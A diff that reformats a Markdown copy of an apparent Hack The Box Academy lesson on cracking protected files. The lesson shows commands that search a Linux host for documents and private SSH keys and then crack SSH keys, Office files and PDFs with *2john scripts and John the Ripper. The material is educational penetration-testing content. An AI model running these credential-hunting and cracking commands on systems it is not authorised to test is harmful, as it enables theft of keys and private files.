@@ -7,15 +7,13 @@
 // Module Difficulty: Medium
 // Section ID: 1322
 // Section Title: Protected Files
-// Page Title: Hack The Box - Academy
+// Page Title: Password Attacks
 // Page Number: 16
 -->
 
 # Protected Files
 
 **Module Name:** Password Attacks **Page Number:** 16
-
-#### 
 
 #### PASSWORD ATTACKS
 
@@ -25,7 +23,7 @@
 
 #### Hunting for Files
 
-``` shell-session
+```shell-session
 cry0l1t3@unixclient:~$ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
 
 File extension:  .xls
@@ -51,7 +49,7 @@ File extension:  .od*
 
 #### Hunting for SSH Keys
 
-``` shell-session
+```shell-session
 cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
 
 /home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
@@ -61,7 +59,7 @@ cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
 
 #### Encrypted SSH Keys
 
-``` shell-session
+```shell-session
 cry0l1t3@unixclient:~$ cat /home/cry0l1t3/.ssh/SSH.private
 
 -----BEGIN RSA PRIVATE KEY-----
@@ -77,7 +75,7 @@ DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
 
 #### John Hashing Scripts
 
-``` shell-session
+```shell-session
 [!bash!]$ locate *2john*
 
 /usr/bin/bitlocker2john
@@ -105,7 +103,7 @@ DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
 ...SNIP...
 ```
 
-``` shell-session
+```shell-session
 [!bash!]$ ssh2john.py SSH.private > ssh.hash
 [!bash!]$ cat ssh.hash 
 
@@ -114,7 +112,7 @@ ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...
 
 #### Cracking SSH Keys
 
-``` shell-session
+```shell-session
 [!bash!]$ john --wordlist=rockyou.txt ssh.hash
 
 Using default input encoding: UTF-8
@@ -130,7 +128,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Session completed
 ```
 
-``` shell-session
+```shell-session
 [!bash!]$ john ssh.hash --show
 
 SSH.private:1234
@@ -142,14 +140,14 @@ SSH.private:1234
 
 #### Cracking Microsoft Office Documents
 
-``` shell-session
+```shell-session
 [!bash!]$ office2john.py Protected.docx > protected-docx.hash
 [!bash!]$ cat protected-docx.hash
 
 Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b
 ```
 
-``` shell-session
+```shell-session
 [!bash!]$ john --wordlist=rockyou.txt protected-docx.hash
 
 Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
@@ -163,7 +161,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-``` shell-session
+```shell-session
 [!bash!]$ john protected-docx.hash --show
 
 Protected.docx:1234
@@ -171,14 +169,14 @@ Protected.docx:1234
 
 #### Cracking PDFs
 
-``` shell-session
+```shell-session
 [!bash!]$ pdf2john.py PDF.pdf > pdf.hash
 [!bash!]$ cat pdf.hash 
 
 PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e
 ```
 
-``` shell-session
+```shell-session
 [!bash!]$ john --wordlist=rockyou.txt pdf.hash
 
 Using default input encoding: UTF-8
@@ -192,7 +190,7 @@ Use the "--show --format=PDF" options to display all of the cracked passwords re
 Session completed
 ```
 
-``` shell-session
+```shell-session
 [!bash!]$ john pdf.hash --show
 
 PDF.pdf:1234
